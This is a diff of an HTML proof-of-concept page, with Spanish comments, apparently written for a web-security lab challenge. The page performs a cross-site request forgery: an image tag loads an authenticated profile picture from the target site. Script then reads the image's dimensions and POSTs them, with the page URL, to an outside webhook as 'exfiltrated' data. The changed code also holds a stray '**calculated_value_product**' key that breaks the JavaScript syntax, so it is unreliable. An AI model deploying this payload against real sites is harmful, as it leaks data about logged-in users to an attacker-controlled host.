@@ -67,7 +67,7 @@
         <p><strong>(El navegador intenta cargar el recurso autenticado ahora mismo.)</strong></p>
         
         <img id="csrf-payload" 
-             src="URL_DEL_LABORATORIO_PARA_LA_IMAGEN" 
+             src="https://chl-08e6c153-4af1-4d8b-b8c4-1587dd634c0a-imagen-importante.softwareseguro.com.ar/profile-pic" 
              alt="Cargando imagen desde el sitio de destino..."
              crossorigin="anonymous">
         
@@ -75,58 +75,68 @@
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const imageElement = document.getElementById('csrf-payload');
-            const statusDiv = document.getElementById('status');
+    document.addEventListener('DOMContentLoaded', () => {
+        const imageElement = document.getElementById('csrf-payload');
+        const statusDiv = document.getElementById('status');
+        
+        // Reemplaza esta URL con tu enlace de Webhook Tester
+        const WEBHOOK_URL = 'https://play.svix.com/in/e_V1KAwUnBcM76UjNKySj4vJirV0R/';
+
+        const updateStatus = (message, isSuccess) => {
+            statusDiv.textContent = message;
+            statusDiv.style.display = 'block';
+            statusDiv.className = isSuccess ? 'status-message status-success' : 'status-message status-error';
+        };
+
+        // 1. Detección de Éxito: Evento 'load'
+        imageElement.addEventListener('load', () => {
             
-            // Reemplaza esta URL con tu enlace de Webhook Tester
-            const WEBHOOK_URL = 'https://play.svix.com/in/e_V1KAwUnBcM76UjNKySj4vJirV0R/';
-
-            const updateStatus = (message, isSuccess) => {
-                statusDiv.textContent = message;
-                statusDiv.style.display = 'block';
-                statusDiv.className = isSuccess ? 'status-message status-success' : 'status-message status-error';
-            };
-
-            // 1. Detección de Éxito: Evento 'load'
-            imageElement.addEventListener('load', () => {
-                const successMessage = '✅ ¡Éxito en el CSRF! El recurso autenticado se cargó.';
-                updateStatus(successMessage, true);
-                console.log(successMessage);
-
-                // ** EXFILTRACIÓN DE LA SEÑAL AL WEBHOOK **
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    // Payload con la señal de éxito
-                    body: JSON.stringify({
-                        attack_type: 'CSRF_SameSite_None',
-                        status: 'Success_Image_Load_Detected',
-                        source_page: window.location.href, 
-                        timestamp: new Date().toISOString()
-                    })
-                })
-                .then(response => {
-                    console.log('Webhook notificado con estado:', response.status);
-                    if (response.status !== 200) {
-                        console.warn('El Webhook no devolvió un código 200 OK. Verifica la configuración.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error al intentar notificar al webhook:', error);
-                });
-            });
+            // ******* CAMBIO CLAVE: CAPTURA DE DIMENSIONES *******
+            const width = imageElement.naturalWidth; // Ancho real de la imagen
+            const height = imageElement.naturalHeight; // Alto real de la imagen
+            const area = width * height; // Producto de las dimensiones
+            // ***************************************************
             
-            // 2. Detección de Fallo: Evento 'error'
-            imageElement.addEventListener('error', () => {
-                const errorMessage = '❌ Fallo en la carga. El recurso no pudo ser cargado.';
-                updateStatus(errorMessage, false);
-                console.error(errorMessage);
-                imageElement.style.display = 'none'; // Oculta el icono de imagen rota
+            const successMessage = `✅ ¡Éxito en el CSRF! Imagen cargada (${width}x${height}). Enviando datos...`;
+            updateStatus(successMessage, true);
+            console.log(successMessage);
+
+            // ** EXFILTRACIÓN DE LA SEÑAL AL WEBHOOK **
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                // Payload con la señal de éxito Y los datos exfiltrados
+                body: JSON.stringify({
+                    attack_type: 'CSRF_Dimension_Exfiltration',
+                    status: 'Success_Image_Load_Detected',
+                    // Datos exfiltrados
+                    image_width: width,
+                    image_height: height,
+                    **calculated_value_product**: area, // El valor que necesitas
+                    // Metadatos de la prueba
+                    source_page: window.location.href, 
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => {
+                console.log('Webhook notificado con estado:', response.status);
+            })
+            .catch(error => {
+                console.error('Error al intentar notificar al webhook:', error);
             });
         });
-    </script>
+        
+        // 2. Detección de Fallo: Evento 'error'
+        imageElement.addEventListener('error', () => {
+            const errorMessage = '❌ Fallo en la carga. El recurso no pudo ser cargado.';
+            updateStatus(errorMessage, false);
+            console.error(errorMessage);
+            imageElement.style.display = 'none';
+        });
+    });
+</script>
 </body>
 </html>
+
